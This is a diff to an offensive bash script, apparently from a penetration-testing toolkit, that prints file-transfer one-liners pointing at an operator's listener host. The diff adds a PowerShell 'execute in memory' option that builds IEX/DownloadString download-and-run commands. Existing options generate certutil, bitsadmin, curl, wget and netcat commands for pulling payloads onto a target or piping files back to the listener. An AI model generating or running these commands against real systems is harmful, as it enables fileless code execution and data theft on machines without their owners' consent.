@@ -25,10 +25,11 @@ echo -e "${GREEN}2${RESET} Certutil Method #1"
 echo -e "${GREEN}3${RESET} Certutil Method #2"
 echo -e "${GREEN}4${RESET} Powershell Download Method #1"
 echo -e "${GREEN}5${RESET} Powershell Download Method #2"
-echo -e "${GREEN}6${RESET} Bitsadmin"
-echo -e "${GREEN}7${RESET} Curl"
-echo -e "${GREEN}8${RESET} nc linux"
-echo -e "${GREEN}9${RESET} nc windows"
+echo -e "${GREEN}6${RESET} Powershell Execute In Memory"
+echo -e "${GREEN}7${RESET} Bitsadmin"
+echo -e "${GREEN}8${RESET} Curl"
+echo -e "${GREEN}9${RESET} nc linux"
+echo -e "${GREEN}10${RESET} nc windows"
 echo ""
 read FILE_TRANSFER_METHOD
 
@@ -48,7 +49,7 @@ if [ "$FILE_TRANSFER_METHOD" = "1" ] ; then
 	echo ""
 	echo -e "${BLUE}Wget method:${RESET}"
 	echo ""
-	for i in $(ls); do echo "wget http://$turtlepower_lhost:$1/$i $i"; done;
+	for i in $(ls); do echo "wget http://$turtlepower_lhost:$1/$i"; done;
 #Certutil Method #1
 elif [ "$FILE_TRANSFER_METHOD" = "2" ]
 then
@@ -77,22 +78,29 @@ then
     echo -e "${BLUE}Powershell Download Method #2:${RESET}"
     echo ""
     for i in $(ls); do echo "powershell.exe Invoke-WebRequest -Uri 'http://$turtlepower_lhost:$1/$i' -OutFile '$i'"; done; 
-# Bitsadmin
 elif [ "$FILE_TRANSFER_METHOD" == "6" ]
+# powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://127.0.0.1/file.exe'))"'
+then
+    echo ""
+    echo -e "${BLUE}Powershell Execute In Memory:${RESET}"
+    echo ""
+    for i in $(ls); do echo "powershell -c \"IEX((New-Object System.Net.WebClient).DownloadString('http://$turtlepower_lhost:$1/$i'))\""; done; 
+# Bitsadmin
+elif [ "$FILE_TRANSFER_METHOD" == "7" ]
 then
 	echo ""
 	echo -e "${BLUE}Bitsadmin method:${RESET}"
 	echo ""
 	for i in $(ls); do echo "bitsadmin /transfer job /download /priority high http://$turtlepower_lhost:$1/$i $i"; done;
 # Curl
-elif [ "$FILE_TRANSFER_METHOD" == "7" ]
+elif [ "$FILE_TRANSFER_METHOD" == "8" ]
 then
     echo ""
     echo -e "${BLUE}Curl method:${RESET}"
     echo ""
-    for i in $(ls); do echo "curl http://$turtlepower_lhost:$1/$i $i"; done;
+    for i in $(ls); do echo "curl http://$turtlepower_lhost:$1/$i -o $i -s"; done;
 # nc linux
-elif [ "$FILE_TRANSFER_METHOD" == "8" ]
+elif [ "$FILE_TRANSFER_METHOD" == "9" ]
 then
     echo ""
     echo -e "${BLUE}Linux nc sending method${RESET}"
@@ -109,7 +117,7 @@ then
     echo ""
     for i in $(ls); do echo "cat ./$i | nc -nv $turtlepower_lhost $1";done;
 # nc windows
-elif [ "$FILE_TRANSFER_METHOD" == "9" ]
+elif [ "$FILE_TRANSFER_METHOD" == "10" ]
 then
     echo ""
     echo -e "${BLUE}Windows nc sending method${RESET}"
